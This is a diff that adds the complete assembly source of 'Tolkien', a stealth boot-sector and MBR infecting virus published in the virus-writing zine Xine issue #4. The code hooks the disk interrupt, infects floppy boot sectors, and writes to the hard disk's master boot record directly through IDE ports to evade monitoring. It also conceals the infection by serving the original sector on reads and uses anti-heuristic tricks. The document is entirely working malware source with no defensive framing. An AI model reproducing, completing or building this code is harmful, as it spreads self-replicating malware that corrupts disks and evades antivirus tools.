@@ -1,0 +1,287 @@
+   ;                                        /-----------------------------\
+   ;                                        | Xine - issue #4 - Phile 307 |
+   ;                                        \-----------------------------/
+
+   ; VIRUS   : Tolkien
+   ; AUTHOR  : Int13h
+   ; ORIGIN  : Paraguay, Sudam‚rica
+   ; LONGITUD: 512 bytes, 1 sector
+   ; DESCRIP.: Stealth BS/MBR infector. Uses HD ports. Some anti-heuristic.
+   ; Dedicated to J.R.R. Tolkien for his great books.
+
+   Tolkien Segment
+   assume cs:Tolkien,ds:Tolkien,es:Tolkien,ss:Tolkien
+   .186
+   org 0
+
+   INICIO:
+   db 0ebh,03ch,090h,04dh,053h,044h,04fh,053h,035h,02eh,030h,000h,002h,001h
+   db 001h,000h,002h,0e0h,000h,040h,00bh,0f0h,009h,000h,012h,000h,002h,000h
+   db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,029h,0f8h,014h,034h
+   db 031h,04eh,04fh,020h,04eh,0cdh,010h,045h,020h,020h,020h,020h,046h,041h
+   db 054h,031h,032h,020h,020h,020h
+
+   cli
+   xor ax,ax
+   mov ss,ax
+   mov sp,07c00h
+   push ss
+   pop ds
+   sti
+
+   mov si,sp
+
+   mov cx,6
+   mov bp,0824h
+   cld
+   ror bp,1
+   sub di,di
+   inc bp
+
+   mov ax,word ptr ss:[bp]
+   add ax,-1
+   mov word ptr ds:[bp],ax
+
+   mov bx,offset Al_Cosmos
+   shl ax,cl
+   mov cx,0cbfeh
+   push ax
+   push ax
+   xor cx,0cafeh
+   pop es
+   push bx
+   repe movsw
+   retf
+
+
+   AL_COSMOS:
+   xchg word ptr ds:[04eh],ax
+   mov word ptr cs:[Seg_CD13],ax
+   mov ax,offset New13Handler
+   xchg word ptr ds:[04ch],ax
+   mov word ptr cs:[Off_CD13],ax
+
+   mov ax,0201h
+   mov bx,200h
+   mov dx,0080h
+   mov cx,1
+   pushf
+   call dword ptr cs:[Off_CD13]
+   jc Lets_Go
+
+   cmp word ptr cs:[bx+offset Marca],'!!'
+   je Lets_Go
+
+   mov byte ptr cs:[Habitat],'H'
+   push ds
+   push es
+   pop ds
+
+   cmp word ptr cs:[bx+04bh],04b4h
+   je Asuncion_Virus_Found
+
+   mov ax,0301h
+   mov bx,200h
+   mov dx,0080h
+   mov cx,0002h
+   pushf
+   call dword ptr cs:[Off_CD13]
+
+   Asuncion_Virus_Found:
+   xor bx,bx
+   mov si,offset Tabla_Outs
+
+   mov dx,01f2h
+   mov cx,6
+   outsb
+   inc dx
+   loop $-2
+
+   in al,dx
+   test al,8
+   jz $-3
+
+   mov si,bx
+   mov cx,256
+   mov dx,1f0h
+   repe outsw
+
+   pop ds
+   mov byte ptr cs:[Habitat],'F'
+
+
+   LETS_GO:
+   push ds
+   pop es
+
+   cmp byte ptr cs:[Habitat],'F'
+   je Floppy
+
+   mov cx,0002h
+   mov dx,0080h
+   jmp short Load_Original
+
+   FLOPPY:
+   mov cx,000eh
+   mov dx,0100h
+
+   LOAD_ORIGINAL:
+   mov ax,0201h
+   mov bx,07c00h
+   int 13h
+   db 0eah
+   dw 07c00h
+   dw 0
+
+
+   NEW13HANDLER:
+   push ax
+   pushf
+   pop ax
+   and ah,11111110b
+   push ax
+   popf
+   pop ax
+   xor ah,0bah
+   cmp ah,(02h xor 0bah)
+   jnz Normal
+   cmp cx,0001h
+   jnz Normal
+   or dx,dx
+   jz Infectar
+   cmp dx,0080h
+   jz Stealth_MBR
+
+   NORMAL:
+   xor ah,0bah
+   db 0eah
+   Off_CD13 dw 0
+   Seg_CD13 dw 0
+   Marca    db '!!'
+
+
+
+   STEALTH_MBR:
+   xor ah,0bah
+   push cx
+   mov cl,02h
+   int 13h
+   pop cx
+   retf 2
+
+
+
+   STEALTH_BS:
+   push ax cx dx
+   mov ax,0201h
+   mov cx,000eh
+   mov dx,0100h
+   pushf
+   call dword ptr cs:[Off_CD13]
+   pop dx cx ax
+   retf 2
+
+
+
+   INFECTAR:
+   xor ah,0bah
+   pushf
+   call dword ptr cs:[Off_CD13]
+   jc See_You
+
+   cmp word ptr es:[bx+offset Marca],'!!'
+   je Stealth_BS
+
+   cmp word ptr es:[bx+13h],0b40h
+   jne See_You
+
+   pushf
+   push ax bx cx si di
+
+   mov ax,word ptr es:[bx+04bh]
+
+   push es ds es
+   pop ds
+   mov word ptr ds:[bx+02fh],010cdh
+   push cs
+   pop es
+   lea si,[bx+3]
+   mov di,3
+   mov cx,3bh
+   rep movsb
+   pop ds es
+
+   cmp ax,04b4h
+   je Asuncion_Virus_Installed
+
+   mov ax,0301h
+   mov cx,000eh
+   mov dx,0100h
+   pushf
+   call dword ptr cs:[Off_CD13]
+
+   Asuncion_Virus_Installed:
+   mov ax,0301h
+   mov cx,1
+   sub dx,dx
+   sub bx,bx
+   push es cs
+   pop es
+   pushf
+   call dword ptr cs:[Off_CD13]
+   pop es
+
+   pop di si cx bx ax
+   popf
+   SEE_YOU:
+   retf 2
+
+   Habitat db 'F'
+   Tabla_Outs db 1,1,0,0,0a0h,030h
+   db ' ' xor 66+6
+   db '[' xor 66+6
+   db 'T' xor 66+6
+   db 'O' xor 66+6
+   db 'L' xor 66+6
+   db 'K' xor 66+6
+   db 'I' xor 66+6
+   db 'E' xor 66+6
+   db 'N' xor 66+6
+   db ']' xor 66+6
+   db ' ' xor 66+6
+   db 'b' xor 66+6
+   db 'y' xor 66+6
+   db ' ' xor 66+6
+   db 'I' xor 66+6
+   db 'n' xor 66+6
+   db 't' xor 66+6
+   db '1' xor 66+6
+   db '3' xor 66+6
+   db 'h' xor 66+6
+   db '!' xor 66+6
+   db ' ' xor 66+6
+   db '<' xor 66+6
+   db '<' xor 66+6
+   db 'P' xor 66+6
+   db 'A' xor 66+6
+   db 'R' xor 66+6
+   db 'A' xor 66+6
+   db 'G' xor 66+6
+   db 'U' xor 66+6
+   db 'A' xor 66+6
+   db 'Y' xor 66+6
+   db ' ' xor 66+6
+   db '1' xor 66+6
+   db '9' xor 66+6
+   db '9' xor 66+6
+   db '8' xor 66+6
+   db '>' xor 66+6
+   db '>' xor 66+6
+   db 1 xor 66+6
+   db 2 xor 66+6
+   org 01feh
+   db 055h,0aah
+   org 0200h
+
+   Tolkien ends
+   End Inicio
